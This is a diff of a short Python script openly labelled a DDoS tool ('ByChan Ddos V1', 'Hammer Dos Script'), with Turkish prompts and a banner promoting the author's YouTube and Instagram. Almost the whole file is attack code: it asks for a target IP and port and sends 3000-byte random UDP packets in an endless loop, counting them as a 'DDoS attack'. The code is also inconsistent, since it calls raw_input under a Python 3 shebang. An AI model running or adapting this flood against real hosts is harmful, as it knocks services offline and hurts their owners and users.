@@ -1,3 +1,9 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+# python 3.3.2+ Hammer Dos Script v.1
+# by ByChan
+
 import socket
 import random
 import os
@@ -29,20 +35,21 @@ banner=bcolors.RED + """
 -            ByChan Ddos V1                    -
 -        Instagram: huseyinaltns               -
 -            Youtube: ByChan                   -
+-   Kanala Abone Olup Like Atmayi Unutmayiniz  -
 ------------------------------------------------
 
 """
 print(banner)
 
-hedef_ip=raw_input("Hedef Ip: ")
-hedef_port=input("Hedef Port: ")
+ip=raw_input("Hedef Ip: ")
+port=input("Hedef Port: ")
 
 bytes=random._urandom(3000)
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
 sayac=0
 while True:
-        sock.sendto(bytes,(hedef_ip,hedef_port))
+        sock.sendto(bytes,(ip, port))
         sayac=sayac+1
         print("Ddos Attack Basladi,Gonderilen Paket:%s"%(sayac))
         
